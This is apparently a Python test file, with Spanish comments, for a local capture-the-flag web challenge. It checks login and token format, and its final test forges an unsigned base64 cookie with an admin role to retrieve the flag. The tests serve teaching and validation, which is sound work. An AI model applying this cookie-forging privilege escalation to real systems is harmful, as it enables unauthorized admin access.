"""
Tests del reto Cookie Falsa.
Requiere el servicio Docker corriendo en localhost:8082.
"""
import requests, base64, json, time, pytest

BASE = "http://localhost:8082"


def _service_up(timeout=3):
    try:
        return requests.get(f"{BASE}/health", timeout=timeout).status_code == 200
    except Exception:
        return False


skip_if_down = pytest.mark.skipif(
    not _service_up(), reason="Servicio cookie_falsa no disponible (arranca Docker)"
)


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        if _service_up(1):
            return
        time.sleep(0.2)
    pytest.skip("Servicio no disponible tras esperar")


@skip_if_down
def test_login_alumno():
    wait_up()
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "alumno", "password": "alumno123"})
    assert r.status_code == 200
    data = r.json()
    assert "token" in data


@skip_if_down
def test_token_is_base64_json():
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "alumno", "password": "alumno123"})
    token = r.json()["token"]
    decoded = json.loads(base64.b64decode(token).decode())
    assert decoded["rol"] == "user"
    assert decoded["usuario"] == "alumno"


@skip_if_down
def test_admin_denied_with_user_token():
    s = requests.Session()
    r = s.post(f"{BASE}/api/login",
               json={"usuario": "alumno", "password": "alumno123"})
    s.cookies.set("session_token", r.json()["token"])
    r2 = s.get(f"{BASE}/admin")
    assert r2.status_code == 403


@skip_if_down
def test_idor_cookie_tampering():
    """Exploit: forjar cookie con rol=admin y enviársela directamente al servidor."""
    forged_payload = {"usuario": "alumno", "rol": "admin"}
    forged_token = base64.b64encode(json.dumps(forged_payload).encode()).decode()
    # Pasar la cookie directamente para evitar conflictos con cookies previas de sesión
    r = requests.get(f"{BASE}/admin", cookies={"session_token": forged_token})
    assert r.status_code == 200
    data = r.json()
    assert "flag" in data
    assert data["flag"].startswith("CTF{")
